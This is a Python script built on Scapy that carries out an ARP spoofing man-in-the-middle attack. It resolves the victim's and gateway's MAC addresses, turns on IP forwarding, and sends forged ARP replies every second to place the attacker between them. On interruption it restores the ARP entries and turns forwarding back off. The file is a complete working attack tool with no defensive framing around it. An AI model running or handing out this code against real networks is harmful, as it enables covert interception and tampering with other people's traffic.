#! /usr/bin/env python3

from scapy.all import send, Ether, ARP, conf, srp, time
import os, sys


class mitm_attack(object):

    def settings_values(self, iface, victim, gateway):

        # Setting values
        self.interface = iface
        self.victimIP = victim
        self.gatewayIP = gateway

        # Disabling verbose mode
        conf.verb = 0

    def mac_getter(self, IP):

        # Sending ARP for take the MAC address
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.2)

        for send, receive in ans:
            return receive.sprintf(r"%Ether.src%")

    def ARPing(self):

        victimMAC = self.mac_getter(self.victimIP)
        AP_MAC = self.mac_getter(self.gatewayIP)

        # Creating and sending ARP packets for try to hide the attack
        send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=AP_MAC), count=10)
        send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=10)

        # Disabling IP Forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

        exit()

    def sending_arp(self):

        victim = self.mac_getter(self.victimIP)
        AP_MAC = self.mac_getter(self.gatewayIP)

        # Those replies places us between them (ARP Spoofing)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst=victim))
        send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst=AP_MAC))

    def main_attack(self):

        print("Enabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        try:
            victimMAC = self.mac_getter(self.victimIP)
            AP_MAC = self.mac_getter(self.gatewayIP)

        except:
            print("Cannot find targets MAC address")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)

        print("Poisoning Targets...")
        while 1:
            try:
                self.sending_arp()
                print("Packets successfully sent..")
                time.sleep(1)
            except KeyboardInterrupt:
                print("Aborting mitm attack..")
                self.ARPing()
                break

    def __init__(self, interface, victim, gateway):
        self.settings_values(interface, victim, gateway)
        # Attack

        self.main_attack()

